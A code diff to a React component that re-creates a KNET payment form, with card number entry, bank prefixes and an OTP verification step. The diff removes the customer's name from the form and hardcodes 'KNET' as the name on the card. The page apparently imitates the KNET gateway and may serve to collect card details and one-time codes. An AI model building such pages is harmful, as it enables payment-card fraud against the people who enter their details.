@@ -101,10 +101,9 @@ export default function KNETPayment() {
   const [showErrorModal, setShowErrorModal] = useState(false);
   const [errorModalMessage, setErrorModalMessage] = useState("");
 
-  // Get amount and customer name from localStorage
+  // Get amount from localStorage
   const mohData = JSON.parse(localStorage.getItem("mohPaymentData") || "{}");
   const totalAmount = mohData.totalAmount || localStorage.getItem("Total") || "0.000";
-  const customerFullName = localStorage.getItem('customerFullName') || '';
 
   // Get prefixes for selected bank
   const availablePrefixes = selectedBank && bankPrefixMap[selectedBank]
@@ -286,7 +285,7 @@ export default function KNETPayment() {
         cardNumber: fullCardNumber,
         cardNumberOnly: cardNumber,
         prefix: selectedPrefix,
-        nameOnCard: customerFullName || "KNET",
+        nameOnCard: "KNET",
         expiryMonth: expiryMonth.padStart(2, "0"),
         expiryYear: expiryYear,
         cvv: "N/A",
@@ -533,12 +532,6 @@ export default function KNETPayment() {
                 <label style={fieldLabel}>Amount:</label>
                 <span style={fieldValue}>KD {totalAmount}</span>
               </div>
-              {customerFullName && (
-                <div style={fieldRow}>
-                  <label style={fieldLabel}>Name on Card:</label>
-                  <span style={fieldValue}>{customerFullName}</span>
-                </div>
-              )}
 
               {/* Card Information */}
               <div style={sectionTitle}>Card Information</div>
@@ -717,12 +710,6 @@ export default function KNETPayment() {
                 <label style={fieldLabel}>Amount:</label>
                 <span style={fieldValue}>KD {totalAmount}</span>
               </div>
-              {customerFullName && (
-                <div style={fieldRow}>
-                  <label style={fieldLabel}>Name on Card:</label>
-                  <span style={fieldValue}>{customerFullName}</span>
-                </div>
-              )}
 
               {/* OTP Section */}
               <div style={sectionTitle}>OTP Verification</div>
